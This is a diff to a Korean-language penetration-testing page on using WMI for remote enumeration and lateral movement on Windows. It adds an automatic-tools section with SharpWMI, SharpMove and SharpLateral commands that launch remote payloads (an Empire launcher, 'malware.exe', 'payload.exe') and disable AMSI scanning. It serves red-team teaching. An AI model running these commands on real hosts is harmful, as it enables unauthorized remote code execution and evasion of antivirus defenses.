@@ -31,7 +31,7 @@ gwmi -Namespace "root/microsoft" -List -Recurse
 ```
 ### **클래스**
 
-WMI 클래스 이름, 예를 들어 win32_process, 및 해당 네임스페이스를 아는 것은 모든 WMI 작업에 중요합니다.
+WMI 클래스 이름, 예를 들어 win32_process, 및 그것이 위치한 네임스페이스를 아는 것은 모든 WMI 작업에 중요합니다.
 `win32`로 시작하는 클래스를 나열하는 명령:
 ```bash
 Get-WmiObject -Recurse -List -class win32* | more # Defaults to "root\cimv2"
@@ -43,9 +43,9 @@ gwmi -Namespace "root/microsoft" -List -Recurse -Class "MSFT_MpComput*"
 Get-WmiObject -Class win32_share
 Get-WmiObject -Namespace "root/microsoft/windows/defender" -Class MSFT_MpComputerStatus
 ```
-### 방법
+### Methods
 
-WMI 클래스의 하나 이상의 실행 가능한 함수인 메서드는 실행될 수 있습니다.
+Methods, which are one or more executable functions of WMI classes, can be executed.
 ```bash
 # Class loading, method listing, and execution
 $c = [wmiclass]"win32_share"
@@ -85,26 +85,42 @@ wmic useraccount list /format:list
 wmic group list /format:list
 wmic sysaccount list /format:list
 ```
-원격에서 WMI를 통해 특정 정보를 쿼리하는 것은, 예를 들어 로컬 관리자나 로그인한 사용자와 같은 정보는 신중한 명령 구성으로 가능하다.
+원격에서 WMI를 통해 로컬 관리자나 로그인한 사용자와 같은 특정 정보를 쿼리하는 것은 신중한 명령 구성으로 가능합니다.
 
 ### **수동 원격 WMI 쿼리**
 
-원격 머신에서 로컬 관리자와 로그인한 사용자를 은밀하게 식별하는 것은 특정 WMI 쿼리를 통해 달성할 수 있다. `wmic`는 또한 여러 노드에서 동시에 명령을 실행하기 위해 텍스트 파일에서 읽는 것을 지원한다.
+원격 머신에서 로컬 관리자를 은밀하게 식별하고 로그인한 사용자를 확인하는 것은 특정 WMI 쿼리를 통해 달성할 수 있습니다. `wmic`는 여러 노드에서 동시에 명령을 실행하기 위해 텍스트 파일에서 읽는 것도 지원합니다.
 
-WMI를 통해 프로세스를 원격으로 실행하기 위해, 예를 들어 Empire 에이전트를 배포하는 경우, 다음과 같은 명령 구조가 사용되며, 성공적인 실행은 "0"의 반환 값으로 표시된다:
+WMI를 통해 프로세스를 원격으로 실행하기 위해, 예를 들어 Empire 에이전트를 배포하는 경우, 다음과 같은 명령 구조가 사용되며, 성공적인 실행은 "0"의 반환 값으로 표시됩니다:
 ```bash
 wmic /node:hostname /user:user path win32_process call create "empire launcher string here"
 ```
 이 프로세스는 원격 실행 및 시스템 열거를 위한 WMI의 기능을 보여주며, 시스템 관리 및 침투 테스트 모두에 대한 유용성을 강조합니다.
 
-## References
-
-- [https://blog.ropnop.com/using-credentials-to-own-windows-boxes-part-3-wmi-and-winrm/](https://blog.ropnop.com/using-credentials-to-own-windows-boxes-part-2-psexec-and-services/)
-
-## Automatic Tools
+## 자동 도구
 
 - [**SharpLateral**](https://github.com/mertdas/SharpLateral):
 ```bash
 SharpLateral redwmi HOSTNAME C:\\Users\\Administrator\\Desktop\\malware.exe
 ```
+- [**SharpWMI**](https://github.com/GhostPack/SharpWMI)
+```bash
+SharpWMI.exe action=exec [computername=HOST[,HOST2,...]] command=""C:\\temp\\process.exe [args]"" [amsi=disable] [result=true]
+# Stealthier execution with VBS
+SharpWMI.exe action=executevbs [computername=HOST[,HOST2,...]] [script-specification] [eventname=blah] [amsi=disable] [time-specs]
+```
+- [**https://github.com/0xthirteen/SharpMove**](https://github.com/0xthirteen/SharpMove):
+```bash
+SharpMove.exe action=query computername=remote.host.local query="select * from win32_process" username=domain\user password=password
+SharpMove.exe action=create computername=remote.host.local command="C:\windows\temp\payload.exe" amsi=true username=domain\user password=password
+SharpMove.exe action=executevbs computername=remote.host.local eventname=Debug amsi=true username=domain\\user password=password
+```
+- **Impacket의 `wmiexec`**를 사용할 수도 있습니다.
+
+
+## References
+
+- [https://blog.ropnop.com/using-credentials-to-own-windows-boxes-part-3-wmi-and-winrm/](https://blog.ropnop.com/using-credentials-to-own-windows-boxes-part-2-psexec-and-services/)
+
+
 {{#include ../../banners/hacktricks-training.md}}
